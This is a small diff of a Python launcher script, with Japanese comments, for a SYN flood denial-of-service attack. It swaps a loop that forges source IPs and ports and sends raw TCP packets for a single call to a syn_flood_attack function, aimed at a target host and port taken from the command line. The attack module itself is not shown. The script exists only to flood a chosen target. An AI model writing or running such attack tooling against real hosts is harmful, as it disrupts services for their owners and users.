@@ -1,15 +1,9 @@
 import sys
 # pychacheを作成しない
-sys.dont_write_bytecode = True
-from dos import syn_flood as sf
+#sys.dont_write_bytecode = True
+from dos import syn_flood
 import argparse
 
 class Main:
-    # SYN Flood攻撃クラス
-    da = sf.SynFlood(sys.argv[1], sys.argv[2])
-    while True:
-        da.createSrcIp()
-        da.createSrcPort()
-        da.createIpPacket()
-        da.createTcpPacket()
-        da.sendPacket()
+    # SYN Flood攻撃
+    syn_flood.syn_flood_attack(sys.argv[1], sys.argv[2])
